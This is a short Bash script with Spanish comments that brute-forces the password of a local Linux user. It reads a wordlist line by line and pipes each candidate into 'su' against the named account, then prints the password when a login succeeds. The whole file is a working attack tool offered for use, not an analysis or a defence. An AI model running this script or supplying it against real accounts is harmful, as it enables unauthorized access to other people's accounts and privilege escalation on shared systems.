#!/bin/bash

# Alerta si faltan argumentos en la ejecución del comando.
help() {
    echo -e "\e[1;33mUso: $0 user txt"
    echo -e "\e[1;31mNecesitas dos argumentos. Debes especificar el usuario y el diccionario.\e[0m"
    exit 1
}

# Imprimir banner al inicio del script.
banner() {
    echo -e "\e[1;34m"  # Cambiar el texto a color azul brillante
    echo "##############################"
    echo "#    Force_Brute_Attack      #"
    echo "##############################"
    echo -e "\e[0m"  # Restablecer los colores a los valores predeterminados
}

# Contención de errores ante una interrupción del script de forma manual. (Ctrl+C)
cleanup() {
    echo -e "\n\e[1;31mAtaque interrumpido. Saliendo...\e[0m"
    exit 130
}

trap cleanup  SIGINT

# Recepción de argumentos del comando.
user=$1
txt=$2

# Comprobación de parametros, si no se reciben dos, se ejecuta el mensaje de alerta.
if [[ $# != 2 ]]; then
    help
fi

# Imprimir banner al inicio del script.
banner

# Lee línea a línea el contenido del diccionario e intenta iniciar sesión con cada contraseña.
while IFS= read -r pass; do
    echo "Probando contraseña: $pass"
    if timeout 0.1 bash -c "echo '$pass' | su $user -c 'echo Hello'" > /dev/null 2>&1; then
        clear
        echo -e "\e[1;32mContraseña para el usuario $user: $pass\e[0m"
        break
    fi
done < "$txt"